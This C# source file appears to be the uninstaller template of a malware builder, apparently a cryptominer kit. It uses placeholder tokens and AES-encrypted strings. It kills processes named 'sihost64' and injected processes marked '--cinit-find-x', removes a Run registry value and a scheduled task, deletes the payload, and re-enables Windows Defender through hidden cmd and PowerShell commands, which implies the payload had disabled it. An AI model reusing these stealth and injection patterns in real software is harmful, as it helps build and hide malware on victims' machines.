using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Linq;
using System.Collections.Generic;
using System.Management;
#if DefDebug
using System.Windows.Forms;
#endif

public partial class Uninstaller
{
    public static string lb = RGetString("#LIBSPATH");
    public static string bD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + lb;

    public static void Main()
    {
#if DefInstall
        try
        {
            foreach (Process proc in Process.GetProcessesByName("sihost64"))
            {
                proc.Kill();
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U1: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RGetString("#REGKEY"), true))
            {
                if (key != null)
                {
                    key.DeleteValue(Path.GetFileName(PayloadPath));
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("This exception is normal." + Environment.NewLine + "U2: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c schtasks /delete /f /tn " + "\"" + Path.GetFileNameWithoutExtension(PayloadPath) + "\"" + " & exit",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U3: " + Environment.NewLine + ex.ToString());
#endif
        }

#endif

        try
        {
            var options = new ConnectionOptions();
            options.Impersonation = ImpersonationLevel.Impersonate;
            var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
            scope.Connect();

            string wmiQuery = string.Format("Select CommandLine, ProcessID from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
            var query = new ObjectQuery(wmiQuery);
            var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
            var managementObjectCollection = managementObjectSearcher.Get();
            foreach (ManagementObject retObject in managementObjectCollection)
            {
                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-x"))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = "/c taskkill /f /PID " + retObject["ProcessID"] + " & exit",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                    });
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U4: " + Environment.NewLine + ex.ToString());
#endif
        }

        Thread.Sleep(3000);
        try
        {
            Directory.Delete(bD, true);
#if DefInstall
            File.Delete(PayloadPath);
#endif
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("This exception is normal. " + Environment.NewLine + "U5: " + Environment.NewLine + ex.ToString());
#endif
        }

#if DefKillWD
        
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c powershell -Command Remove-MpPreference -ExclusionPath '%cd%' & powershell -Command Remove-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Remove-MpPreference -ExclusionPath '%AppData%' & powershell -Command Remove-MpPreference -ExclusionPath '%Temp%' & powershell -Command Set-MpPreference -DisableArchiveScanning $false & powershell -Command Set-MpPreference -DisableBehaviorMonitoring $false & powershell -Command Set-MpPreference -DisableRealtimeMonitoring $false & powershell -Command Set-MpPreference -DisableScriptScanning $false & powershell -Command Set-MpPreference -DisableIntrusionPreventionSystem $false & powershell -Command Set-MpPreference -DisableIOAVProtection $false & powershell -Command Set-MpPreference -EnableControlledFolderAccess Enabled & powershell Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name DisableAntiSpyware -Force & sc config WinDefend start=enabled & sc start WinDefend & powershell -Command Start-Service WinDefend  & powershell -Command Set-Service WinDefend -StartupType Enabled & powershell -Command Install-WindowsFeature -Name Windows-Defender & powershell -Command Add-WindowsFeature Windows-Defender, Windows-Defender-GUI & Dism /online /Enable-Feature /FeatureName:Windows-Defender /NoRestart /quiet & exit",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U6: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif
    }

    public static string RGetString(string rarg1)
    {
        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(rarg1)));
    }

    public static byte[] RAES_Decryptor(byte[] rarg1)
    {
        var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
        var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
        var k1 = new Rfc2898DeriveBytes("#KEY", saltValueBytes, 100);
        var symmetricKey = new RijndaelManaged();
        symmetricKey.KeySize = 256;
        symmetricKey.Mode = CipherMode.CBC;
        var decryptor = symmetricKey.CreateDecryptor(k1.GetBytes(16), initVectorBytes);
        using (var mStream = new MemoryStream())
        {
            using (var cStream = new CryptoStream(mStream, decryptor, CryptoStreamMode.Write))
            {
                cStream.Write(rarg1, 0, rarg1.Length);
                cStream.Close();
            }

            return mStream.ToArray();
        }
    }
}